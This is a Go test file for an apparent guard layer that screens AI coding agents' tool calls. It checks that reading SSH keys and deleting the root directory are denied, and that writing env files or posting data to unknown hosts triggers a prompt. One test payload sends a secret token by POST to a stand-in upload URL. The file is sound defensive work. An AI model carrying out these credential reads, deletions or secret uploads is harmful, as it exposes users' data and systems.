package guard

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestAdaptClaudePayloadMapsBashCommand(t *testing.T) {
	payload := readGuardFixture(t, "claude", "bash-git-status.json")
	action, err := AdaptClaudePayload(payload)
	if err != nil {
		t.Fatalf("adapt claude payload: %v", err)
	}
	if action.Client != "claude" || action.ToolName != "Bash" || action.ActionType != "command" || action.Command != "git status" {
		t.Fatalf("unexpected adapted action: %+v", action)
	}
}

func TestAdaptClaudePayloadMapsReadTarget(t *testing.T) {
	payload := readGuardFixture(t, "claude", "bash-read-ssh.json")
	action, err := AdaptClaudePayload(payload)
	if err != nil {
		t.Fatalf("adapt claude read payload: %v", err)
	}
	if action.ToolName != "Read" || action.ActionType != "read" || !strings.Contains(strings.ToLower(action.Target), `.ssh`) {
		t.Fatalf("unexpected read action: %+v", action)
	}
}

func TestAdaptCodexPayloadMapsShellCommand(t *testing.T) {
	payload := readGuardFixture(t, "codex", "bash-rm-root.json")
	action, err := AdaptCodexPayload(payload)
	if err != nil {
		t.Fatalf("adapt codex shell payload: %v", err)
	}
	if action.Client != "codex" || action.ToolName != "shell" || action.ActionType != "command" || !strings.Contains(action.Command, "Remove-Item") {
		t.Fatalf("unexpected codex action: %+v", action)
	}
}

func TestEvaluateAdaptedPayloadFixtures(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name       string
		client     string
		file       string
		decision   string
		wouldBlock bool
		wouldAsk   bool
		silent     bool
	}{
		{name: "claude git status", client: "claude", file: "bash-git-status.json", decision: "allow", silent: true},
		{name: "claude read ssh", client: "claude", file: "bash-read-ssh.json", decision: "deny", wouldBlock: true},
		{name: "claude write env", client: "claude", file: "write-env.json", decision: "ask", wouldAsk: true},
		{name: "codex remove root", client: "codex", file: "bash-rm-root.json", decision: "deny", wouldBlock: true},
		{name: "codex unknown post", client: "codex", file: "network-post-env.json", decision: "ask", wouldAsk: true},
	}
	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			payload := readGuardFixture(t, tc.client, tc.file)
			result, err := EvaluateAdaptedPayload(AdapterInput{Client: tc.client, Payload: payload})
			if err != nil {
				t.Fatalf("evaluate adapted payload: %v", err)
			}
			if result.Mode != AdapterModeDryRun || result.Decision != tc.decision || result.WouldBlock != tc.wouldBlock || result.WouldAsk != tc.wouldAsk || result.Silent != tc.silent {
				t.Fatalf("unexpected adapter result: %+v", result)
			}
		})
	}
}

func TestEvaluateAdaptedPayloadEnforceModeOnlyChangesMode(t *testing.T) {
	payload := readGuardFixture(t, "claude", "bash-read-ssh.json")
	result, err := EvaluateAdaptedPayload(AdapterInput{Client: "claude", Mode: AdapterModeEnforce, Payload: payload})
	if err != nil {
		t.Fatalf("evaluate enforce mode: %v", err)
	}
	if result.Mode != AdapterModeEnforce || !result.WouldBlock || result.Decision != "deny" {
		t.Fatalf("unexpected enforce result: %+v", result)
	}
	if !strings.Contains(result.Message, "enforce") {
		t.Fatalf("expected enforce message, got %q", result.Message)
	}
}

func TestEvaluateAdaptedPayloadRejectsInvalidJSON(t *testing.T) {
	_, err := EvaluateAdaptedPayload(AdapterInput{Client: "claude", Payload: []byte(`{"tool_name":`)})
	if err == nil || !strings.Contains(err.Error(), "JSON 无效") {
		t.Fatalf("expected concise invalid JSON error, got %v", err)
	}
}

func TestEvaluateAdaptedPayloadRejectsUnknownClientAndMode(t *testing.T) {
	payload := readGuardFixture(t, "claude", "bash-git-status.json")
	if _, err := EvaluateAdaptedPayload(AdapterInput{Client: "unknown", Payload: payload}); err == nil || !strings.Contains(err.Error(), "claude 或 codex") {
		t.Fatalf("expected unknown client error, got %v", err)
	}
	if _, err := EvaluateAdaptedPayload(AdapterInput{Client: "claude", Mode: "block", Payload: payload}); err == nil || !strings.Contains(err.Error(), "dry-run 或 enforce") {
		t.Fatalf("expected unknown mode error, got %v", err)
	}
}

func TestReadAdapterPayloadSupportsStdin(t *testing.T) {
	originalStdin := os.Stdin
	reader, writer, err := os.Pipe()
	if err != nil {
		t.Fatalf("create stdin pipe: %v", err)
	}
	t.Cleanup(func() {
		os.Stdin = originalStdin
		_ = reader.Close()
	})
	os.Stdin = reader
	payload := []byte(`{"tool_name":"Bash","tool_input":{"command":"git status"}}`)
	go func() {
		_, _ = writer.Write(payload)
		_ = writer.Close()
	}()

	data, err := ReadAdapterPayload("-")
	if err != nil {
		t.Fatalf("read adapter stdin: %v", err)
	}
	if string(data) != string(payload) {
		t.Fatalf("unexpected stdin payload: %s", string(data))
	}
}

func TestAdapterResultDoesNotLeakPayloadContent(t *testing.T) {
	payload := []byte(`{
		"tool_name":"network.request",
		"cwd":"F:\\workspace\\AgentToolGate",
		"project_root":"F:\\workspace\\AgentToolGate",
		"args":{"method":"POST","url":"https://unknown.example.invalid/upload","body":"ATG_TOKEN=super-secret-token"}
	}`)
	result, err := EvaluateAdaptedPayload(AdapterInput{Client: "codex", Payload: payload})
	if err != nil {
		t.Fatalf("evaluate sensitive payload: %v", err)
	}
	encoded, err := json.Marshal(result)
	if err != nil {
		t.Fatalf("marshal result: %v", err)
	}
	text := strings.ToLower(string(encoded))
	for _, leaked := range []string{"super-secret-token", "atg_token", "network.request"} {
		if strings.Contains(text, leaked) {
			t.Fatalf("adapter result leaked payload value %q: %s", leaked, text)
		}
	}
}

func readGuardFixture(t *testing.T, client, name string) []byte {
	t.Helper()
	path := filepath.Join("..", "..", "..", "examples", "guard-hooks", client, name)
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read fixture %s: %v", path, err)
	}
	return data
}
